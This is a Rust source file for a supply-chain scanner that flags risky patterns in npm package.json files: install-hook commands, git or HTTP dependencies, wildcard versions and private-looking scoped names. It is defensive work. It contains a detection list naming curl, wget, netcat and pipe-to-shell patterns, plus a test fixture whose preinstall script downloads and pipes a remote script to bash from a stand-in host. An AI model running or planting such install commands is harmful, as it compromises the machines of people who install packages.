//! Package Confusion and Supply Chain Attack Detection
//!
//! Detects suspicious patterns in package.json files that may indicate:
//! - Malicious install scripts (preinstall, postinstall)
//! - Remote code execution during npm install
//! - Package typosquatting
//! - Dependency confusion attacks

use crate::models::vulnerability::{Location, Severity, Vulnerability, VulnerabilityType};
use anyhow::{Context, Result};
use serde_json::Value;
use std::path::PathBuf;
use tracing::{debug, info};

/// Detect package confusion and malicious install scripts in package.json
pub fn detect(content: &str, file_path: &str) -> Result<Vec<Vulnerability>> {
    debug!("Scanning {} for package confusion and supply chain attacks", file_path);

    let mut vulnerabilities = Vec::new();

    // Parse JSON
    let package_json: Value = serde_json::from_str(content)
        .context("Failed to parse package.json")?;

    // Check scripts section for malicious patterns
    if let Some(scripts) = package_json.get("scripts").and_then(|s| s.as_object()) {
        vulnerabilities.extend(detect_malicious_scripts(scripts, file_path)?);
    }

    // Check dependencies for suspicious patterns
    if let Some(deps) = package_json.get("dependencies").and_then(|d| d.as_object()) {
        vulnerabilities.extend(detect_suspicious_dependencies(deps, file_path)?);
    }

    if let Some(dev_deps) = package_json.get("devDependencies").and_then(|d| d.as_object()) {
        vulnerabilities.extend(detect_suspicious_dependencies(dev_deps, file_path)?);
    }

    // Check for private package indicators that might be confused
    if let Some(name) = package_json.get("name").and_then(|n| n.as_str()) {
        if name.starts_with('@') {
            vulnerabilities.extend(check_scoped_package_confusion(name, file_path)?);
        }
    }

    if !vulnerabilities.is_empty() {
        info!("Found {} supply chain vulnerabilities in {}", vulnerabilities.len(), file_path);
    }

    Ok(vulnerabilities)
}

/// Detect malicious patterns in npm scripts
fn detect_malicious_scripts(
    scripts: &serde_json::Map<String, Value>,
    file_path: &str,
) -> Result<Vec<Vulnerability>> {
    let mut vulnerabilities = Vec::new();

    // Dangerous lifecycle hooks
    let dangerous_hooks = vec!["preinstall", "install", "postinstall", "preuninstall"];

    // Malicious patterns to detect
    let malicious_patterns = vec![
        ("curl", "Remote script download with curl"),
        ("wget", "Remote script download with wget"),
        ("| bash", "Piping to bash shell"),
        ("| sh", "Piping to sh shell"),
        ("eval", "Use of eval with potential remote code"),
        ("http://", "HTTP download (insecure)"),
        ("https://", "Remote script execution"),
        ("nc ", "Netcat usage (potential reverse shell)"),
        ("base64", "Base64 encoding (obfuscation)"),
        ("chmod +x", "Making files executable"),
        ("rm -rf", "Destructive file operations"),
    ];

    for (script_name, script_value) in scripts {
        let script_content = script_value.as_str().unwrap_or("");

        // Check if this is a dangerous lifecycle hook
        let is_dangerous_hook = dangerous_hooks.contains(&script_name.as_str());

        // Check for malicious patterns
        for (pattern, description) in &malicious_patterns {
            if script_content.contains(pattern) {
                let severity = if is_dangerous_hook &&
                    (pattern.contains("curl") || pattern.contains("wget") || pattern.contains("bash")) {
                    Severity::Critical
                } else if is_dangerous_hook {
                    Severity::High
                } else {
                    Severity::Medium
                };

                vulnerabilities.push(Vulnerability {
                    id: format!("PKG-SCRIPT-{}", script_name.to_uppercase()),
                    title: format!("Suspicious {} Script in package.json", script_name),
                    description: format!(
                        "The '{}' script contains a suspicious pattern: {}. This could execute \
                        malicious code during package installation.",
                        script_name, description
                    ),
                    severity,
                    vuln_type: VulnerabilityType::SupplyChainAttack,
                    location: Some(Location {
                        file: file_path.to_string(),
                        line: None,
                        column: None,
                    }),
                    code_snippet: Some(format!("\"{}\":  \"{}\"", script_name, script_content)),
                    impact: Some(
                        "Malicious install scripts can execute arbitrary code with the privileges \
                        of the user running npm install, potentially leading to data theft, \
                        system compromise, or supply chain attacks."
                            .to_string(),
                    ),
                    remediation: Some(
                        "Review the script carefully. If this is a legitimate use case, ensure \
                        the source is trusted. Consider using --ignore-scripts flag when installing \
                        untrusted packages."
                            .to_string(),
                    ),
                    confidence: 0.85,
                    cwe_id: Some(506), // CWE-506: Embedded Malicious Code
                    owasp: Some("A06:2021 – Vulnerable and Outdated Components".to_string()),
                    references: vec![
                        "https://blog.npmjs.org/post/141702881055/package-install-scripts-vulnerability"
                            .to_string(),
                    ],
                });
            }
        }
    }

    Ok(vulnerabilities)
}

/// Detect suspicious dependency patterns
fn detect_suspicious_dependencies(
    dependencies: &serde_json::Map<String, Value>,
    file_path: &str,
) -> Result<Vec<Vulnerability>> {
    let mut vulnerabilities = Vec::new();

    for (dep_name, dep_version) in dependencies {
        let version_str = dep_version.as_str().unwrap_or("");

        // Check for git URLs (potential for malicious repositories)
        if version_str.starts_with("git://")
            || version_str.starts_with("git+ssh://")
            || version_str.starts_with("git+https://")
            || version_str.contains("github.com") && version_str.contains(".git") {

            vulnerabilities.push(Vulnerability {
                id: format!("PKG-GIT-DEP-{}", dep_name.to_uppercase()),
                title: "Git URL Dependency".to_string(),
                description: format!(
                    "Dependency '{}' is installed from a Git URL. This bypasses npm registry \
                    security checks and could point to a malicious repository.",
                    dep_name
                ),
                severity: Severity::Medium,
                vuln_type: VulnerabilityType::SupplyChainAttack,
                location: Some(Location {
                    file: file_path.to_string(),
                    line: None,
                    column: None,
                }),
                code_snippet: Some(format!("\"{}\":  \"{}\"", dep_name, version_str)),
                impact: Some(
                    "Git dependencies can be modified without version control, potentially \
                    introducing malicious code."
                        .to_string(),
                ),
                remediation: Some(
                    "Use published npm packages from the registry when possible. If a Git \
                    dependency is necessary, verify the repository's authenticity and pin to \
                    a specific commit hash."
                        .to_string(),
                ),
                confidence: 0.70,
                cwe_id: Some(829), // CWE-829: Inclusion of Functionality from Untrusted Control Sphere
                owasp: Some("A06:2021 – Vulnerable and Outdated Components".to_string()),
                references: vec![],
            });
        }

        // Check for HTTP URLs (insecure)
        if version_str.starts_with("http://") {
            vulnerabilities.push(Vulnerability {
                id: format!("PKG-HTTP-DEP-{}", dep_name.to_uppercase()),
                title: "Insecure HTTP Dependency".to_string(),
                description: format!(
                    "Dependency '{}' is fetched over HTTP (not HTTPS), which is vulnerable to \
                    man-in-the-middle attacks.",
                    dep_name
                ),
                severity: Severity::High,
                vuln_type: VulnerabilityType::SupplyChainAttack,
                location: Some(Location {
                    file: file_path.to_string(),
                    line: None,
                    column: None,
                }),
                code_snippet: Some(format!("\"{}\":  \"{}\"", dep_name, version_str)),
                impact: Some(
                    "An attacker on the network can intercept the HTTP request and serve \
                    malicious code instead of the legitimate dependency."
                        .to_string(),
                ),
                remediation: Some(
                    "Use HTTPS URLs or preferably install from the npm registry."
                        .to_string(),
                ),
                confidence: 0.95,
                cwe_id: Some(829),
                owasp: Some("A02:2021 – Cryptographic Failures".to_string()),
                references: vec![],
            });
        }

        // Check for wildcard versions (always latest, risky)
        if version_str == "*" || version_str == "latest" {
            vulnerabilities.push(Vulnerability {
                id: format!("PKG-WILDCARD-{}", dep_name.to_uppercase()),
                title: "Wildcard Version Dependency".to_string(),
                description: format!(
                    "Dependency '{}' uses wildcard or 'latest' version. This can introduce \
                    breaking changes or compromised versions.",
                    dep_name
                ),
                severity: Severity::Low,
                vuln_type: VulnerabilityType::InsecureConfiguration,
                location: Some(Location {
                    file: file_path.to_string(),
                    line: None,
                    column: None,
                }),
                code_snippet: Some(format!("\"{}\":  \"{}\"", dep_name, version_str)),
                impact: Some(
                    "If a dependency is compromised or introduces breaking changes, your \
                    application will automatically use the problematic version."
                        .to_string(),
                ),
                remediation: Some(
                    "Pin dependencies to specific versions or use version ranges (^, ~) for \
                    controlled updates. Use package-lock.json to lock dependency trees."
                        .to_string(),
                ),
                confidence: 0.80,
                cwe_id: Some(1104), // CWE-1104: Use of Unmaintained Third Party Components
                owasp: Some("A06:2021 – Vulnerable and Outdated Components".to_string()),
                references: vec![],
            });
        }
    }

    Ok(vulnerabilities)
}

/// Check for potential package confusion attacks on scoped packages
fn check_scoped_package_confusion(
    package_name: &str,
    file_path: &str,
) -> Result<Vec<Vulnerability>> {
    let mut vulnerabilities = Vec::new();

    // Scoped packages like @company/internal-lib
    // If this looks like an internal/private package but is being installed from public registry,
    // it could be a dependency confusion attack

    // Common indicators of private packages
    let private_indicators = vec!["internal", "private", "corp", "company", "enterprise"];

    for indicator in private_indicators {
        if package_name.to_lowercase().contains(indicator) {
            vulnerabilities.push(Vulnerability {
                id: "PKG-CONFUSION-SCOPE".to_string(),
                title: "Potential Package Confusion Attack".to_string(),
                description: format!(
                    "Scoped package '{}' appears to be a private/internal package based on its name. \
                    Verify this package is being installed from your private registry, not the public \
                    npm registry.",
                    package_name
                ),
                severity: Severity::Medium,
                vuln_type: VulnerabilityType::SupplyChainAttack,
                location: Some(Location {
                    file: file_path.to_string(),
                    line: None,
                    column: None,
                }),
                code_snippet: Some(format!("\"name\": \"{}\"", package_name)),
                impact: Some(
                    "Dependency confusion attacks occur when an attacker publishes a malicious \
                    package with the same name as your private package to the public registry. \
                    If your package manager is misconfigured, it may install the malicious public \
                    version instead of your private package."
                        .to_string(),
                ),
                remediation: Some(
                    "1. Configure .npmrc to only allow installation of scoped packages from your \
                    private registry. 2. Use package-lock.json to pin exact versions. 3. Consider \
                    using npm Enterprise or a private registry with namespace protection."
                        .to_string(),
                ),
                confidence: 0.60,
                cwe_id: Some(427), // CWE-427: Uncontrolled Search Path Element
                owasp: Some("A06:2021 – Vulnerable and Outdated Components".to_string()),
                references: vec![
                    "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610".to_string(),
                ],
            });
            break; // Only report once per package
        }
    }

    Ok(vulnerabilities)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_malicious_preinstall_script() {
        let package_json = r#"{
            "name": "test-package",
            "scripts": {
                "preinstall": "curl http://malicious.com/script.sh | bash"
            }
        }"#;

        let result = detect(package_json, "package.json").unwrap();
        assert!(!result.is_empty(), "Should detect malicious preinstall script");

        let has_curl = result.iter().any(|v| v.description.contains("curl"));
        let has_bash = result.iter().any(|v| v.description.contains("bash"));
        assert!(has_curl || has_bash, "Should detect curl or bash pattern");
    }

    #[test]
    fn test_detect_git_url_dependency() {
        let package_json = r#"{
            "name": "test-package",
            "dependencies": {
                "suspicious-lib": "git+https://github.com/attacker/malicious.git"
            }
        }"#;

        let result = detect(package_json, "package.json").unwrap();
        assert!(!result.is_empty(), "Should detect Git URL dependency");

        let has_git_warning = result.iter().any(|v| v.title.contains("Git URL"));
        assert!(has_git_warning, "Should warn about Git URL dependency");
    }

    #[test]
    fn test_detect_http_dependency() {
        let package_json = r#"{
            "name": "test-package",
            "dependencies": {
                "insecure-lib": "http://example.com/package.tgz"
            }
        }"#;

        let result = detect(package_json, "package.json").unwrap();
        assert!(!result.is_empty(), "Should detect HTTP dependency");

        let has_http = result.iter().any(|v| {
            v.title.contains("HTTP") && v.severity == Severity::High
        });
        assert!(has_http, "Should flag HTTP dependency as High severity");
    }

    #[test]
    fn test_detect_wildcard_version() {
        let package_json = r#"{
            "name": "test-package",
            "dependencies": {
                "risky-lib": "*"
            }
        }"#;

        let result = detect(package_json, "package.json").unwrap();
        assert!(!result.is_empty(), "Should detect wildcard version");

        let has_wildcard = result.iter().any(|v| v.title.contains("Wildcard"));
        assert!(has_wildcard, "Should warn about wildcard version");
    }

    #[test]
    fn test_clean_package_json() {
        let package_json = r#"{
            "name": "test-package",
            "version": "1.0.0",
            "dependencies": {
                "express": "^4.18.0",
                "react": "^18.2.0"
            },
            "scripts": {
                "start": "node index.js",
                "test": "jest"
            }
        }"#;

        let result = detect(package_json, "package.json").unwrap();
        assert!(result.is_empty(), "Clean package.json should have no vulnerabilities");
    }
}
